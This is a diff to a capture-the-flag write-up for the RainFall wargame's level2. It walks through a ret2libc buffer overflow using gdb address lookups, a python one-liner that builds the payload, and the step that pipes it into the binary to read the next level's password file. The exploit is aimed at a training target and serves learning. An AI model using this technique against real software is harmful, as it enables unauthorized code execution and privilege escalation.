@@ -8,7 +8,7 @@ to arbitrarily change a running program's functionality through a buffer overflo
 Here we don't have the fancy system() function so we can perform a ret2libc to call system()
 
 To start a shell we need a special stack structure like this
-[ data to overflow ] [ system() address ] [ return address ] [ "/bin/sh" address ]
+[ data to overflow ] [ system() address ] [ return address ] [ "/bin/sh" address in enviroment variable ]
 
 We can get the system address with gdb
 
@@ -18,19 +18,21 @@ level2@RainFall:~$> gdb level2
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 
+Then the "/bin/sh" string's address in the enviroment
+
 (gdb) find 0xb7f80000,+0xffff,"/bin/sh"
 0xb7f8cc58
 warning: Unable to access target memory at 0xb7fd3160, halting search.
 1 pattern found.
 
 
-We can craft a overflow payload which contain 76 bytes of data
-followed by 4 bytes which assert (DATA & 0xb0000000) != 0xb0000000
+We can craft a overflow payload which contain 80 bytes of data
+followed by the address of a return instruction to bypass the assert (RETURN_ADDR & 0xb0000000) != 0xb0000000
 followed by the address of the system() function [0xb7e6b060],
 followed by 4 bytes that we don't care here,
 followed by the address of the "/bin/sh" string [0xb7f8cc58]
 
-level2@RainFall:~$> python -c 'print "\x00" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\x22\x85\x04\x08" + "\x58\xcc\xf8\xb7"' > /tmp/payload2
+level2@RainFall:~$> python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "CCCC" + "\x58\xcc\xf8\xb7"' > /tmp/payload2
 level2@RainFall:~$> cat /tmp/payload2 - | ./level2
 
 level3@RainFall:~$> cat ~level3/.pass
